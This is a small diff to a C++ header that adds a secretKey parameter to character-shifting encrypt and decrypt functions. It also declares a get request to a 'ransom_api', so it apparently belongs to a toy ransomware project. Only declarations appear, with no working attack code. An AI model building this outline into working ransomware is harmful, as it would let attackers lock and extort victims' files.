@@ -5,10 +5,10 @@
 bool getFileContents(std::string fileName, std::vector<std::string> & fileContents);
 
 // Basic function to read all chars and increment them by one. 
-void basicEncryptContent(std::string& content);
+void basicEncryptContent(std::string& content, int secretKey);
 
 // Basic function to read all chars and decrement them by one.
-void basicDecryptContent(std::string& content);
+void basicDecryptContent(std::string& content, int secretKey);
 
 // Get request to ransom_api.
 std::string get_request(std::string uri);
